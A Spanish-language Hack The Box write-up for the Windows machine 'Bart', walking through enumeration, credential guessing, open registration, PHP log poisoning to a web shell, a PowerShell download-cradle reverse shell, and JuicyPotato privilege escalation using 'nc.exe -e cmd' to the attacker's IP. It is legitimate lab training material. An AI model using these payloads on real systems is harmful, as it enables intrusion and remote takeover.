---
title: "Bart - WriteUp"
date: Thu Oct 17 2024 20:00:00 GMT+0200 (Central European Summer Time)
categories: [WriteUps, HTB, Windows]
tags: [ctf, nmap, htb, dirb, reverse-shell, wordpress, wfuzz, windows, gobuster, iis]
image: /assets/img/htb-writeups/Pasted-image-20240220130347.png
---

{% include machine-info.html
  machine="Bart"
  os="Windows"
  difficulty="Medium"
  platform="HTB"
%}

![Bart](/assets/img/htb-writeups/Pasted-image-20240220130347.png)

Tags:           

-----

![BART](/assets/img/htb-writeups/Pasted-image-20240220130347.png)

Bart es una máquina bastante realista, que se centra principalmente en técnicas de enumeración adecuadas. Existen varias políticas de seguridad que pueden aumentar la dificultad para quienes no están familiarizados con los entornos Windows.

------

#### ENUM

NMAP
```bash
 # Nmap 7.94SVN scan initiated Tue Feb 20 13:08:53 2024 as: nmap -sCV -p 80 --stylesheet=https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/stable/nmap-bootstrap.xs
 l -oN targeted -oX targetedXML 10.129.96.185
 Nmap scan report for 10.129.96.185
 Host is up (0.041s latency).
 
 PORT   STATE SERVICE VERSION
 80/tcp open  http    Microsoft IIS httpd 10.0
 |_http-title: Did not follow redirect to http://forum.bart.htb/
 |_http-server-header: Microsoft-IIS/10.0
 | http-vulners-regex: 
 |   /main.html: 
 |     cpe:/a:microsoft:iis:10.0
 |   /index.php: 
 |_    cpe:/a:php:php:7.1.7
 | http-methods: 
```

HTTP Redirige a  forum.bart.htb

![BART](/assets/img/htb-writeups/Pasted-image-20240220141041.png)

WHATWEB

```bash
WhatWeb report for http://forum.bart.htb/
Status    : 200 OK
Title     : BART
IP        : 10.129.96.185
Country   : RESERVED, ZZ

Summary   : Bootstrap, Email[d.simmons@bart.htb,h.potter@bart.htb,info@bart.htb,r.hilton@bart.htb,s.brown@bart.loca,s.brown@bart.local], HTML5, HTTPServer[Microsoft-IIS/10.0], JQuery, MetaGenerator[WordPress 4.8.2], Microsoft-IIS[10.0], PoweredBy[WordPress], Script[text/javascript], WordPress[4.8.2]

[ MetaGenerator ]
	This plugin identifies meta generator tags and extracts its 
	value. 

	String       : WordPress 4.8.2
```

Tenemos los que parece cuentas de usuario válidas (las apuntamos) y vemos que la web corre bajo un WordPress versión 4.8.2

FUZZING NORMAL y SUBDOMINIOS

```BASH
$ wfuzz -c -f sub-domains --hc 302 --hh 334 -u 'http://bart.htb' -H "Host: FUZZ.bart.htb" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200
...
000000067:   200        548 L    2412 W     35529 Ch    "forum"                                                                    000001614:   200        80 L     221 W      3423 Ch     "monitor"
```

Si navegamos a la ruta /monitor encontramos un login:

![BART](/assets/img/htb-writeups/Pasted-image-20240220181238.png)

Hacemos varias pruebas con credenciales comunes pero no obtenemos resultados.

Si le damos a la botón "Forgot password?" nos lleva a la siguiente pantalla:

![BART](/assets/img/htb-writeups/Pasted-image-20240220183744.png)

Nos damos cuenta que si introducimos un usuario al azar como admin o rafa nos arroja el siguiente error:

![BART](/assets/img/htb-writeups/Pasted-image-20240220183853.png)

Pero si introducimos los nombres de usuarios encontrados...

![BART](/assets/img/htb-writeups/Pasted-image-20240220192530.png)

Bien, podría ser una vía potencial de enumerar usuarios o hacer algo más...

Usuarios verificados:
```
- daniel
- harvey
```

Al probar las credenciales del tipo nombre/apellido increíblemente damos con unas credenciales válidas:

```http
harvey:potter
```

![BART](/assets/img/htb-writeups/Pasted-image-20240220193420.png)

Al pulsar en cualquier sección, nos redirige al subdominio _monitor.bart.htb_. Lo damos de alta en el archivo hosts y continuamos.

![BART](/assets/img/htb-writeups/Pasted-image-20240220194107.png)

Descubrimos otro subdominio, lo damos de alta y le damos al enlace.

![BART](/assets/img/htb-writeups/Pasted-image-20240220194507.png)

Si nos fijamos en la URL vemos que abre in formulario en PHP de una carpeta llamada _simple_chat_. Vamos a buscar información en Google y de casualidad exista.

![BART](/assets/img/htb-writeups/Pasted-image-20240220195841.png)

Y parece ser que existe: https://github.com/magkopian/php-ajax-simple-chat/tree/master/simple_chat

Vamos a analizar el código...

En "register.php" vemos lo siguiente:

```php
//check if username is provided
if (!isset($_POST['uname']) || empty($_POST['uname'])) {
	$errors['uname'] = 'The Username is required';
} else {
	//validate username
	if (($uname = validate_username($_POST['uname'])) === false) {
		$errors['uname'] = 'The Username is invalid';
	}
}

//check if password is provided
if (!isset($_POST['passwd']) || empty($_POST['passwd'])) {
	$errors['passwd'] = 'The Password is required';
} else {
	//validate password
	
	if (($passwd = validate_password($_POST['passwd'])) === false) {
		$errors['passwd'] = 'The Password must be at least 8 characters';
	}
}
```

Según el código si le pasamos por POST un usuario (uname) y un password (passwd) podemos registrar un usuario por la cara. Vamos a probarlo:

```bash
$ curl -s -X POST "http://internal-01.bart.htb/simple_chat/register.php" -d 'uname=andy&passwd=andy12345'
```

![BART](/assets/img/htb-writeups/Pasted-image-20240220200815.png)

Y pa dentro....

![BART](/assets/img/htb-writeups/Pasted-image-20240220200856.png)

Vemos esto:

![BART](/assets/img/htb-writeups/Pasted-image-20240220201024.png)

Analizando la URL diría que puede ser vulnerable:

```http
http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey
```

Aprovechándonos de la vulnerabilidad de log-poisoning vamos a lanzar un script en Python para obtener un RCE:

```Python
# Script Python3 Log-Poisoning

import requests

log_poisoning_url = "http://internal-01.bart.htb/log/log.php?filename=rce.php&username=harvey"

headers = {'User-Agent': '<?php system($_REQUEST["cmd"]); ?>'}

r = requests.get(log_poisoning_url, headers=headers)
```

Al ejecutarlo tendremos ejecución remota de comandos, por ejemplo:

```http
http://internal-01.bart.htb/log/rce.php?cmd=whoami
```

![BART](/assets/img/htb-writeups/Pasted-image-20240222122352.png)

Vamos a intentar obtener una reverse shell.

Nos descargamos _Invoke-PowerShellTcp.ps1_ de https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1

Editamos el archivo y al final de todo introducimos esta línea, modificando la IP por la que tengamos en ese momento.

```PowerShell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.131 -Port 443
```

Nos ponemos a la escucha:

```bash
$ rlwrap nc -nlvp 443
```

En otra consola montamos un servidor web:

```bash
$ python3 -m http.server 80
```

Y ya lo tenemos todo preparado para ejecutar la reverse shell en la URL del RCE que hemos creado:

```http
http://internal-01.bart.htb/log/rce.php?cmd=powershell IEX(New-Object Net.WebClient).downloadString(%27http://10.10.14.131/Invoke-PowerShellTcp.ps1%27)
```

![BART](/assets/img/htb-writeups/Pasted-image-20240222124505.png)

Y pa dentro...

Tenemos los siguientes permisos:

```PowerShell
PS C:\inetpub\wwwroot\internal-01\log> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name          Description                               State  
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects                     Enabled
```

Vemos que tenemos habilitado "SeImpersonatePrivilege" por lo que podemos empezar a pelar patatas...

Ahora lo único que nos hace falta es subir JuicyPotato y escalaremos privilegios:

Nos descargamos y transferimos a la máquina víctima los siguientes archivos:

JUICY POTATO https://github.com/ohpe/juicy-potato/releases/tag/v0.1
NETCAT https://eternallybored.org/misc/netcat/

Nos ponemos a la escucha y ejecutamos el potato con CLSID de Windows 10 :

```PowerShell
> .\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\temp\nc.exe -e cmd 10.10.14.131 4444" -c "{5B3E6773-3A99-4A3D-8096-7765DD11785C}"

Testing {5B3E6773-3A99-4A3D-8096-7765DD11785C} 1337
......
[+] authresult 0
{5B3E6773-3A99-4A3D-8096-7765DD11785C};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

![BART](/assets/img/htb-writeups/Pasted-image-20240222184258.png)

Buscamos las banderas y máquina finalizada...

La de usuario está en "C:\\Users\\h.potter\\Desktop"
---

**Última actualización**: 2024-10-17<br>
**Autor**: A. Lorente<br>
**Licencia**: Creative Commons BY-NC-SA 4.0
